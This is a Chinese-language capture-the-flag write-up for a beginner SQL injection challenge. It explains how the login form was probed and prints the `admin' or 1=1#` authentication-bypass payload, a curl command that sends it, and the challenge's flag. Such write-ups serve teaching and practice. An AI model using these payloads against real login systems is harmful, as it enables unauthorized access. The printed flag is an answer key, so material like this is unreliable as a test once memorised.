# [极客大挑战 2019]EasySQL

## 题目概述
一个简单的登录页面，用户名和密码通过 GET 方式提交到 `check.php`，后端使用 MariaDB。

## 信息收集
- 访问题目页面，发现是一个登录表单，表单 action 为 `check.php`，method 为 `GET`
- 参数为 `username` 和 `password`
- 正常登录返回 "NO,Wrong username password！！！"

## 漏洞分析
- **漏洞类型**：SQL 注入（SQLi）
- **原理**：后端直接将用户输入拼接到 SQL 查询中，未做任何过滤或参数化处理
- **判断过程**：在 username 中加入单引号 `'`，页面返回 MariaDB 语法错误，确认存在 SQL 注入

## 利用过程

### Payload
```
username=admin' or 1=1#
password=123
```

SQL 查询大致为：
```sql
SELECT * FROM users WHERE username='admin' or 1=1#' AND password='123'
```
`#` 注释掉后面的密码判断，`or 1=1` 使条件恒为真，绕过登录验证。

### Flag
```
flag{3896e710-7315-4cf8-b158-eb22f52947ea}
```

## 复现步骤
1. `curl -s -G "http://题目URL/check.php" --data-urlencode "username=admin' or 1=1#" --data-urlencode "password=123"`
2. 页面返回 "Login Success!" 和 flag

## 技术总结
| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|-------|
| SQL 注入 | 登录表单 GET 参数 | `admin' or 1=1#` | 万能密码绕过、注释符 `#` |

## 知识总结
- 最基础的 SQL 注入题型，万能密码 `admin' or 1=1#` 直接绕过
- GET 方式传参时需注意 `#` 的 URL 编码问题（`%23` 或使用 `--data-urlencode`）
- MariaDB 中 `#` 和 `--` 均可作为注释符
